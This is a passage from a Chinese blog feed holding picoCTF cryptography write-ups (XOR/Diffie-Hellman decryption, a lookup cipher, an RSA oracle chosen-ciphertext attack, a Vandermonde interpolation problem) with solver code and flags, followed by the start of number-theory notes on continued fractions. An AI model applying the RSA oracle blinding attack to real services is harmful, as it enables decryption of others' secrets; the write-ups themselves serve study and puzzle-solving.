semi_cipher = dynamic_xor_encrypt(plain_text, text_key)</span><br><span class="line">    cipher = encrypt(semi_cipher, shared_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;cipher is: <span class="subst">&#123;cipher&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    message = sys.argv[<span class="number">1</span>]</span><br><span class="line">    test(message, <span class="string">&quot;trudeau&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目给出的另一个附件如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = 89</span><br><span class="line">b = 27</span><br><span class="line">cipher is: [33588, 276168, 261240, 302292, 343344, 328416, 242580, 85836, 82104, 156744, 0, 309756, 78372, 18660, 253776, 0, 82104, 320952, 3732, 231384, 89568, 100764, 22392, 22392, 63444, 22392, 97032, 190332, 119424, 182868, 97032, 26124, 44784, 63444]</span><br></pre></td></tr></table></figure><h3 id="分析">分析</h3><p>分析代码可以知道有一个<code>share_key</code>，把它求出来（很简单，不知道他为什么要把<code>pow(a,b,p)</code>包装成一个新的函数）然后通过<code>cipher</code>里面每一个元素除以<code>share_key</code>和311得到一个串，跟<code>text_key</code>进行一个异或（<code>dynamic_xor_encrypt</code>）再对得到的<code>plaintext</code>进行反转。</p><h3 id="解题">解题</h3><p>先求<code>share_key</code>:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">u = <span class="built_in">pow</span>(g, a, p)</span><br><span class="line">v = <span class="built_in">pow</span>(g, b, p)</span><br><span class="line">key = <span class="built_in">pow</span>(v, a, p)</span><br><span class="line">b_key = <span class="built_in">pow</span>(u, b, p)</span><br><span class="line"><span class="keyword">if</span> key == b_key:</span><br><span class="line">    shared_key = key</span><br></pre></td></tr></table></figure><p>求出<code>share_key</code>之后就可以将<code>cipher</code>除以<code>share_key</code>和311得到一个串：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">temp = [x//shared_key//<span class="number">311</span> <span class="keyword">for</span> x <span class="keyword">in</span> cipher]</span><br></pre></td></tr></table></figure><p>将<code>temp</code>与<code>text_key</code>进行一个异或，其中<code>text_key=&quot;trudeau&quot;</code>得到一字符串后反转就可以得到flag：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">text_key = <span class="string">&quot;trudeau&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(temp)):</span><br><span class="line">    s += <span class="built_in">chr</span>(<span class="built_in">ord</span>(temp[i])^<span class="built_in">ord</span>(text_key[i%<span class="built_in">len</span>(text_key)]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>总体代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">97</span></span><br><span class="line">g = <span class="number">31</span></span><br><span class="line">a = <span class="number">89</span></span><br><span class="line">b = <span class="number">27</span></span><br><span class="line">cipher = [<span class="number">33588</span>, <span class="number">276168</span>, <span class="number">261240</span>, <span class="number">302292</span>, <span class="number">343344</span>, <span class="number">328416</span>, <span class="number">242580</span>, <span class="number">85836</span>, <span class="number">82104</span>, <span class="number">156744</span>, <span class="number">0</span>, <span class="number">309756</span>, <span class="number">78372</span>, <span class="number">18660</span>, <span class="number">253776</span>, <span class="number">0</span>, <span class="number">82104</span>, <span class="number">320952</span>, <span class="number">3732</span>, <span class="number">231384</span>, <span class="number">89568</span>, <span class="number">100764</span>, <span class="number">22392</span>, <span class="number">22392</span>, <span class="number">63444</span>, <span class="number">22392</span>, <span class="number">97032</span>, <span class="number">190332</span>, <span class="number">119424</span>, <span class="number">182868</span>, <span class="number">97032</span>, <span class="number">26124</span>, <span class="number">44784</span>, <span class="number">63444</span>]</span><br><span class="line"></span><br><span class="line">u = <span class="built_in">pow</span>(g, a, p)</span><br><span class="line">v = <span class="built_in">pow</span>(g, b, p)</span><br><span class="line">key = <span class="built_in">pow</span>(v, a, p)</span><br><span class="line">b_key = <span class="built_in">pow</span>(u, b, p)</span><br><span class="line"><span class="keyword">if</span> key == b_key:</span><br><span class="line">    shared_key = key</span><br><span class="line"></span><br><span class="line">temp = [<span class="built_in">chr</span>(x//shared_key//<span class="number">311</span>) <span class="keyword">for</span> x <span class="keyword">in</span> cipher]</span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">text_key = <span class="string">&quot;trudeau&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(temp)):</span><br><span class="line">    s += <span class="built_in">chr</span>(<span class="built_in">ord</span>(temp[i])^<span class="built_in">ord</span>(text_key[i%<span class="built_in">len</span>(text_key)]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>运行可得flag：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">picoCTF&#123;custom_d2cr0pt6d_dc499538&#125;</span><br></pre></td></tr></table></figure><h2 id="c3">C3</h2><p>加密代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">chars = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> fileinput <span class="keyword">import</span> <span class="built_in">input</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">input</span>():</span><br><span class="line">  chars += line</span><br><span class="line"></span><br><span class="line">lookup1 = <span class="string">&quot;\n \&quot;#()*+/1:=[]abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">lookup2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrst&quot;</span></span><br><span class="line"></span><br><span class="line">out = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">prev = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">  cur = lookup1.index(char)</span><br><span class="line">  out += lookup2[(cur - prev) % <span class="number">40</span>]</span><br><span class="line">  prev = cur</span><br><span class="line"></span><br><span class="line">sys.stdout.write(out)</span><br></pre></td></tr></table></figure><p>题目给出的另外一个附件内容如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DLSeGAGDgBNJDQJDCFSFnRBIDjgHoDFCFtHDgJpiHtGDmMAQFnRBJKkBAsTMrsPSDDnEFCFtIbEDtDCIbFCFtHTJDKerFldbFObFCFtLBFkBAAAPFnRBJGEkerFlcPgKkImHnIlATJDKbTbFOkdNnsgbnJRMFnRBNAFkBAAAbrcbTKAkOgFpOgFpOpkBAAAAAAAiClFGIPFnRBaKliCgClFGtIBAAAAAAAOgGEkImHnIl</span><br></pre></td></tr></table></figure><p>可以知道附件是<code>chars</code>加密得到的，分析代码后写出解密代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chipher = <span class="string">&#x27;DLSeGAGDgBNJDQJDCFSFnRBIDjgHoDFCFtHDgJpiHtGDmMAQFnRBJKkBAsTMrsPSDDnEFCFtIbEDtDCIbFCFtHTJDKerFldbFObFCFtLBFkBAAAPFnRBJGEkerFlcPgKkImHnIlATJDKbTbFOkdNnsgbnJRMFnRBNAFkBAAAbrcbTKAkOgFpOgFpOpkBAAAAAAAiClFGIPFnRBaKliCgClFGtIBAAAAAAAOgGEkImHnIl&#x27;</span></span><br><span class="line">lookup1 = <span class="string">&quot;\n \&quot;#()*+/1:=[]abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">lookup2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrst&quot;</span></span><br><span class="line">chars = <span class="string">&#x27;&#x27;</span></span><br><span class="line">prev = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chipher)):</span><br><span class="line">    cur = lookup2.index(chipher[i])</span><br><span class="line">    chars += lookup1[(cur + prev)%<span class="number">40</span>]</span><br><span class="line">    prev = (cur + prev)%<span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(chars)</span><br></pre></td></tr></table></figure><p>运行代码可得：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#asciiorder</span></span><br><span class="line"><span class="comment">#fortychars</span></span><br><span class="line"><span class="comment">#selfinput</span></span><br><span class="line"><span class="comment">#pythontwo</span></span><br><span class="line"></span><br><span class="line">chars = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> fileinput <span class="keyword">import</span> <span class="built_in">input</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">input</span>():</span><br><span class="line">    chars += line</span><br><span class="line">b = <span class="number">1</span> / <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chars)):</span><br><span class="line">    <span class="keyword">if</span> i == b * b * b:</span><br><span class="line">        <span class="built_in">print</span> chars[i] <span class="comment">#prints</span></span><br><span class="line">        b += <span class="number">1</span> / <span class="number">1</span></span><br></pre></td></tr></table></figure><p>会发现解出来是一串缺少参数<code>chars</code>内容的代码，猜测这里的<code>chars</code>就是上面求解出来的<code>chars</code>，拼接上一条代码再进行修改后得到如下代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chipher = <span class="string">&#x27;DLSeGAGDgBNJDQJDCFSFnRBIDjgHoDFCFtHDgJpiHtGDmMAQFnRBJKkBAsTMrsPSDDnEFCFtIbEDtDCIbFCFtHTJDKerFldbFObFCFtLBFkBAAAPFnRBJGEkerFlcPgKkImHnIlATJDKbTbFOkdNnsgbnJRMFnRBNAFkBAAAbrcbTKAkOgFpOgFpOpkBAAAAAAAiClFGIPFnRBaKliCgClFGtIBAAAAAAAOgGEkImHnIl&#x27;</span></span><br><span class="line">lookup1 = <span class="string">&quot;\n \&quot;#()*+/1:=[]abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">lookup2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrst&quot;</span></span><br><span class="line">chars = <span class="string">&#x27;&#x27;</span></span><br><span class="line">prev = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chipher)):</span><br><span class="line">    cur = lookup2.index(chipher[i])</span><br><span class="line">    chars += lookup1[(cur + prev)%<span class="number">40</span>]</span><br><span class="line">    prev = (cur + prev)%<span class="number">40</span></span><br><span class="line"></span><br><span class="line">b = <span class="number">1</span> / <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chars)):</span><br><span class="line">    <span class="keyword">if</span> i == b * b * b:</span><br><span class="line">        <span class="built_in">print</span>(chars[i],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        b += <span class="number">1</span> / <span class="number">1</span></span><br></pre></td></tr></table></figure><p>运行得到的字符串包裹上<code>picoCTF&#123;&#125;</code>即可得到flag：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">picoCTF&#123;adlibs&#125;</span><br></pre></td></tr></table></figure><h2 id="rsa_oracle">rsa_oracle</h2><p>这道题考点较多，但是算是模板题，所以难度不算高.</p><h3 id="分析-1">分析</h3><p>首先题目给了个预言机（Oracle），通过交互我们可以发现可以通过这个Oracle对一些东西进行加密或者解密，而文件中给出了一个password.enc文件，从题目描述中的“<strong>After some intensive reconassainance they found out that the bank has an oracle that was used to encrypt the password</strong>”可以知道password.enc里面的数据是通过Oracle中内置的RSA的参数进行加密的，但是我们并不能将password.enc的数据直接丢进Oracle里面得到password，故我们考虑使用选择密文攻击得到password。得到password之后，我们通过<strong>hint2：OpenSSL can be used to decrypt the message. e.g <code>openssl enc -aes-256-cbc -d ...</code></strong> （或者通过message.enc里面的格式）可以知道需要通过OpenSSL解密message.enc得到flag，而密码就是password.enc解密得到的。</p><h3 id="解题-1">解题</h3><h4 id="第一步先通过选择明文攻击得到oracle中的rsa加密的参数">第一步：先通过选择明文攻击得到Oracle中的RSA加密的参数</h4><p>由RSA的原理，我们可以得到以下式子： <span class="math display">\[2^e\equiv c_2\pmod{n}\\4^e\equiv c_4\pmod{n}\\8^e\equiv c_8\pmod{n}\]</span> 可得： <span class="math display">\[c_2^2\equiv c_4\pmod{n}\\c_2^3\equiv c_8\pmod{n}\]</span> 即： <span class="math display">\[c_2^2-c_4=k_1n\\c_2^3-c_8=k_2n\]</span> 在一般情况下，有<span class="math inline">\((c_2^2-c_4,c_2^3-c_8)=n\)</span></p><p>自此，我们得到了<span class="math inline">\(n\)</span>，现在要得到<span class="math inline">\(e\)</span>，猜测<span class="math inline">\(e\)</span>小于<span class="math inline">\(100000\)</span>，使用上面求出的<span class="math inline">\(c_2\)</span>（或者<span class="math inline">\(c_4,c_8\)</span>）进行爆破，就得到了<span class="math inline">\(e\)</span>。</p><p>该步代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;地址&quot;</span>,端口)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get pow(2,e,n)</span></span><br><span class="line">data = io.recv()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">io.sendline(<span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">data = io.recv()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">io.sendline(<span class="built_in">chr</span>(<span class="number">2</span>).encode())</span><br><span class="line">data = ((io.recv().split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">11</span>]).split(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">0</span>]).decode()</span><br><span class="line">c2 = <span class="built_in">int</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get pow(4,e,n)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">data = io.recv()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">io.sendline(<span class="built_in">chr</span>(<span class="number">4</span>).encode())</span><br><span class="line">data = ((io.recv().split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">11</span>]).split(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">0</span>]).decode()</span><br><span class="line">c4 = <span class="built_in">int</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get pow(8,e,n)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">data = io.recv()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">io.sendline(<span class="built_in">chr</span>(<span class="number">8</span>).encode())</span><br><span class="line">data = ((io.recv().split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">11</span>]).split(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">0</span>]).decode()</span><br><span class="line">c8 = <span class="built_in">int</span>(data)</span><br><span class="line"></span><br><span class="line">n = gmpy2.gcd(c2**<span class="number">2</span>-c4,c2**<span class="number">3</span>-c8)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(<span class="number">2</span>,e,n)==c2:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><h4 id="第二步通过选择密文攻击得到passwordopenssl中用于解密的key">第二步：通过选择密文攻击得到password（OpenSSL中用于解密的key）</h4><p>由于不能直接解密password（后面将里面的数记为<span class="math inline">\(c\)</span>），而从一般通过Oracle选择密文攻击的题目，我们可以知道他应该也不能解密<span class="math inline">\(c+kn,k\in Z\)</span>，我们考虑通过解密<span class="math inline">\(c*s^e\ mod\ n\)</span>来得到我们需要的东西。</p><p>解密之后可以得到<span class="math inline">\(s\)</span>倍的<span class="math inline">\(m\)</span>（这里<span class="math inline">\(m\)</span>就是解密后的<code>password</code>），乘上<span class="math inline">\(inv(s,n)\)</span>再模<span class="math inline">\(n\)</span>（这里<span class="math inline">\(inv(a,b)\)</span>表示<span class="math inline">\(a\)</span>模<span class="math inline">\(b\)</span>的乘法逆元）就可以还原出<code>password</code>了（需要<code>long_to_bytes</code>）</p><p>核心代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.sendline(<span class="built_in">str</span>(c*<span class="built_in">pow</span>(<span class="number">2</span>,e,n)%n).encode())</span><br></pre></td></tr></table></figure><h4 id="第三步">第三步</h4><p>通过OpenSSL对message.enc通过<code>aes_256_cbc</code>算法进行解密，命令大致如下：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">openssl enc <span class="literal">-aes-256-cbc</span> <span class="literal">-d</span> <span class="operator">-in</span> (这里是message.enc的路径) <span class="literal">-out</span> flag.txt <span class="literal">-k</span> (这里是password)</span><br></pre></td></tr></table></figure><p>就可以得到flag了.</p><h2 id="flag_printer">flag_printer</h2><p>算法优化题，卡了好久，感觉这题不应该出现在Cryptography里面.</p><p>题目给出了一个30.8MB的文本文件，里面有1769611组数，还给出了一个python源码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> galois</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">MOD = <span class="number">7514777789</span></span><br><span class="line"></span><br><span class="line">points = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;encoded.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read().strip().split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">    x, y = line.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    points.append((<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)))</span><br><span class="line"></span><br><span class="line">GF = galois.GF(MOD)</span><br><span class="line"></span><br><span class="line">matrix = []</span><br><span class="line">solution = []</span><br><span class="line"><span class="keyword">for</span> point <span class="keyword">in</span> points:</span><br><span class="line">    x, y = point</span><br><span class="line">    solution.append(GF(y % MOD))</span><br><span class="line"></span><br><span class="line">    row = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(points)):</span><br><span class="line">        row.append(GF(x**i%MOD))</span><br><span class="line"></span><br><span class="line">    matrix.append(GF(row))</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;output.bmp&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(<span class="built_in">bytearray</span>(np.linalg.solve(GF(matrix), GF(solution)).tolist()[:-<span class="number">1</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由代码可以知道我们需要求解如下方程： <span class="math display">\[\left[\begin{matrix}x_0^0&amp;x_0^1&amp;x_0^2&amp;\cdots&amp;x_0^{n-1}\\x_1^0&amp;x_1^1&amp;x_1^2&amp;\cdots&amp;x_1^{n-1}\\x_2^0&amp;x_2^1&amp;x_2^2&amp;\cdots&amp;x_2^{n-1}\\\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots\\x_{n-1}^0&amp;x_{n-1}^1&amp;x_{n-1}^2&amp;\cdots&amp;x_{n-1}^{n-1}\\\end{matrix}\right]\left[\begin{matrix}\alpha_0\\\alpha_1\\\alpha_2\\\vdots\\\alpha_{n-1}\end{matrix}\right]=\left[\begin{matrix}y_0\\y_1\\y_2\\\vdots\\y_{n-1}\end{matrix}\right]\]</span> 可以看到，左式的<span class="math inline">\(n\times n\)</span>矩阵是一个范德蒙德矩阵，所以优先考虑范德蒙德方程组求解，找到<strong>Björck-Pereyra算法</strong>，后面发现在Python中需要分配11.4TB的内存，并不能解决问题。</p><p>再观察矩阵可以发现对于任意<span class="math inline">\(x_i(i=0,1,2,\cdots,n-1)\)</span>，有：<span class="math inline">\(\alpha_0x_i^0+\alpha_1x_i^1+\alpha_2x_i^2+\cdots+\alpha_{n-1}x_i^{n-1}=y_i\)</span></p><p>可以知道，这显然可以利用拉格朗日插值法，得到的函数应为：<span class="math inline">\(f(x)=\alpha_0x^0+\alpha_1x^1+\alpha_2x^2+\cdots+\alpha_{n-1}x^{n-1}\)</span></p><p>但是一般的拉格朗日插值法时间复杂度太高，不能达到我想要的效果（实际上如果是硬跑的话还是可以跑出flag的），故考虑FFT（快速傅里叶变换），但是可惜的是我对算法的学习不深，并不知道怎么写FFT.</p>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>连分数（Continued Fractions）笔记</title>
      <link href="/2024/03/09/%E8%BF%9E%E5%88%86%E6%95%B0%EF%BC%88Continued-Fractions%EF%BC%89%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/03/09/%E8%BF%9E%E5%88%86%E6%95%B0%EF%BC%88Continued-Fractions%EF%BC%89%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>本篇部分整理自《初等数论（第四版）》（闵嗣鹤，严士健编）</em></p></blockquote><h2 id="连分数的定义">连分数的定义</h2><p>形如： <span class="math display">\[a_1+\frac{1}{a_2+\frac{1}{\begin{matrix}a_3+\\&amp;&amp;\ddots\\&amp;&amp;&amp;&amp;+\frac{1}{a_n}\end{matrix}}}\tag{1}\]</span> 的分数被称作连分数。</p><p>在平常的使用中，为了节省篇幅，我们一般使用以下符号来表示上述连分数： <span class="math display">\[a_1+\frac{1}{a_2+}\frac{1}{a_3+}\frac{1}{a_4+}\cdots\frac{1}{a_n}或[a_1,a_2,\cdots ,a_n]\]</span> 其中第二种表示方式最常用。</p><h2 id="有关连分数的一些定理定义">有关连分数的一些定理&amp;定义</h2><h3 id="定义1连分数的渐进分数">定义1（连分数的渐进分数）：</h3><p><span class="math inline">\([a_1,a_2,\cdots ,a_k]=\frac{p_k}{q_k}\ (1\le k\le n)\)</span>叫做连分数<span class="math inline">\((1)\)</span>的第<span class="math inline">\(k\)</span>个<strong>渐进分数</strong></p><h3 id="定义2简单连分数">定义2（简单连分数）：</h3><p>若<span class="math inline">\(a_1\)</span>是整数，<span class="math inline">\(a_2,a_3,\cdots,a_k,\cdots\)</span>是正整数，则连分数 <span class="math display">\[[a_1,a_2,\cdots,a_k,\cdots]\]</span> 称为<strong>简单连分数</strong>，若<span class="math inline">\(a\)</span>的个数有限，则称为<strong>有限简单连分数</strong>，若<span class="math inline">\(a\)</span>的个数无限，则称为<strong>无限简单连分数</strong>.</p><p>对于无限连分数，若当<span class="math inline">\(k→∞\)</span>时<span class="math inline">\([a_1,a_2,\cdots,a_n,\cdots]\)</span>的渐进分数<span class="math inline">\(\frac{p_k}{q_k}\)</span>存在极限，则称这个极限为<strong>连分数<span class="math inline">\([a_1,a_2,\cdots,a_n,\cdots]\)</span>的值.</strong></p><h3 id="定义3循环连分数">定义3（循环连分数）：</h3><p>对于一个无限连分数<span class="math inline">\([a_1,a_2,\cdots,a_n,\cdots]\)</span>，如果能找到两个整数<span class="math inline">\(s\ge0,t&gt;0\)</span>使得 <span class="math display">\[a_{s+i}=a_{s+kt+i},\ \ \ i=1,2,\cdots,t;\ \ \ \ k=0,1,2,\cdots\]</span> 这个无限简单连分数就叫<strong>循环连分数</strong>，并简单地把它记作 <span class="math display">\[[a_1,a_2, \cdots ,a_s,a_{s+1},\cdots ,a_{s+t}]\]</span></p><h3 id="定理1">定理1：</h3><p>若连分数<span class="math inline">\([a_1,a_2,\cdots ,a_n]\)</span>的渐进分数是<span class="math inline">\(\frac{p_1}{q_1},\frac{p_2}{q_2},\cdots ,\frac{p_n}{q_n}\)</span>，则在这些渐进分数之间，下列关系成立： <span class="math display">\[\begin{matrix}p_1=a_1,p_2=a_2a_1+1&amp;p_k=a_kp_{k-1}+p_{k-2},\\ q_1=1,q_2=a_2\ \ \ \ \ \ \ \ \ \ \ \ \ &amp;q_k=a_kq_{k-1}+q_{k-2},\end{matrix}\cdots,\ \ \ 3\le k\le n\]</span></p><h3 id="定理2">定理2：</h3><p>若连分数<span class="math inline">\([a_1,a_2,\cdots ,a_n]\)</span>的<span class="math inline">\(n\)</span>个渐进连分数是<span class="math inline">\(\frac{p_k}{q_k},k=1,2,\cdots,n\)</span>，则下列两关系成立： <span class="math display">\[\begin{flalign}&amp;(1)\ \ p_kq_{k-1}-p_{k-1}q_k=(-1)^k,\ \ \ \ \ \ \ \ \ \ k\ge 2\\ &amp;(2)\ \ p_kq_{k-2}-p_{k-2}q_k=(-1)^{k-1}a_k,\ \ k\ge3\end{flalign}\]</span></p><h3 id="定理3">定理3：</h3><p>设<span class="math inline">\([a_1,a_2,\cdots,a_n,\cdots]\)</span>是简单连分数，<span class="math inline">\(\frac{p_k}{q_k}(k=1,2,\cdots)\)</span>是它的渐进分数，则： <span class="math display">\[\begin{flalign}&amp;(1)\ \ 当k\ge 3时，q_k\ge q_{k-1}+1，因而对任何k来说,q_k\ge k-1\\ &amp;(2)\ \ \frac{p_{2(k-1)}}{q_{2(k-1)}}&gt;\frac{p_{2k}}{q_{2k}},\frac{p_{2k-1}}{q_{2k-1}}&gt;\frac{p_{2k-3}}{q_{2k-3}},\frac{p_{2k}}{q_{2k}}&gt;\frac{p_{2k-1}}{q_{2k-1}}\\ &amp;(3)\frac{p_k}{q_k}(k=1,2,\cdots)都是既约分数\end{flalign}\]</span></p><h3 id="定理4">定理4：</h3><p>每一简单连分数表示一个实数.</p><h3 id="定理5">定理5：</h3><p>任一实无理数可以表成无限简单连分数.</p><h4 id="定理5的推论">定理5的推论：</h4><p>对于实无理数<span class="math inline">\(\alpha\)</span>，有 <span class="math display">\[\alpha=\frac{p_k}{q_k}+\frac{(-1)^{k-1}\delta_k}{q_kq_{k+1}}或\alpha=\frac{p_k}{q_k}+\frac{(-1)^{k-1}\delta&#39;_k}{q_k^2},其中0&lt;\delta_k&lt;1,0&lt;\delta&#39;_k&lt;1\]</span></p><h3 id="定理6">定理6：</h3><p>每一实无理数只有一种唯一的方法表成无限简单连分数.</p><h3 id="定理7">定理7：</h3><p><span class="math display">\[\begin{flalign}&amp;(1)若\frac{a}{b}=[a_1,a_2,\cdots,a_n]=[b_1,b_2,\cdots,b_n],且a_n&gt;1,b_m&gt;1，则m=n,a_i=b_i\ \ (i=1,2,\cdots,n)\\ &amp;(2)任一有理数\frac{a}{b}有且仅有两种方法表成简单连分数，即\frac{a}{b}=[a_1,a_2,\cdots,a_n]=[a_1,a_2,\cdots,a_n-1,1]\end{flalign}\]</span></p><h3 id="定理8">定理8：</h3><p>若<span class="math inline">\(\alpha\)</span>是任一实数，<span class="math inline">\(\frac{p_k}{q_k}\)</span>是<span class="math inline">\(\alpha\)</span>的第<span class="math inline">\(k\)</span>个渐进分数，则在分母小于等于<span class="math inline">\(q_k\)</span>的一切有理数中，<span class="math inline">\(\frac{p_k}{q_k}\)</span>是<span class="math inline">\(\alpha\)</span>最好的有理近似值，即若<span class="math inline">\(0&lt;q\le q_k\)</span>，则 <span class="math display">\[|{\alpha-\frac{p_k}{q_k}}|\le|{\alpha-\frac{p}{q}}|\]</span></p><h3 id="定理9">定理9：</h3><p>每一循环连分数一定是某一整系数二次不可约方程的实根.</p><h3 id="定理10">定理10：</h3><p>若<span class="math inline">\(f(x)=ax^2+bx+c\)</span>是一个整系数二次不可约多项式，<span class="math inline">\(\alpha\)</span>是<span class="math inline">\(f(x)=0\)</span>的一个实根，则表示<span class="math inline">\(\alpha\)</span>的简单连分数是一循环连分数.</p><h3 id="定理11legendre定理">定理11（Legendre定理）：</h3><p>对于有理数<span class="math inline">\(\alpha\)</span>，若整数<span class="math inline">\(c,d\)</span>满足 <span class="math display">\[|{\alpha-\frac{c}{d}}|&lt;\frac{1}{2d^2}\]</span> 那么<span class="math inline">\(\frac{c}{d}\)</span>就是<span class="math inline">\(\alpha\)</span>的一个有理近似.</p><h2 id="连分数的应用实例">连分数的应用实例</h2><h3 id="佩尔方程pell-equation">佩尔方程(Pell equation)</h3><h4 id="定义">定义：</h4><p>形如<span class="math inline">\(x^2-dy^2=1\)</span>的不定方程被称为<strong>佩尔方程</strong></p><p>现求佩尔方程有正整数解的条件：</p><p>在实数域对方程<span class="math inline">\(x^2-dy^2=1\)</span>进行分解有<span class="math inline">\((x+\sqrt{d}y)(x-\sqrt{d}y)=1\)</span></p><p>(1)当<span class="math inline">\(d\)</span>为完全平方数</p><p>则有<span class="math inline">\(x+\sqrt{d}y,x-\sqrt{d}y\)</span>均为整数，那么若<span class="math inline">\((x+\sqrt{d}y)(x-\sqrt{d}y)=1\)</span>，则必有<span class="math inline">\(x+\sqrt{d}y=x-\sqrt{d}y=1\)</span></p><p>而满足这种情况的非负整数对<span class="math inline">\((x,y)=(1,0)\)</span>所以方程<span class="math inline">\(x^2-dy^2=1\)</span>并不存在正整数解.</p><p>(2)当<span class="math inline">\(d\)</span>为非完全平方数</p><h3 id="定理12">定理12：</h3><p>对任何正整数<span class="math inline">\(n\)</span>，都存在两个整数<span class="math inline">\(P_n,Q_n\)</span>，使得 <span class="math 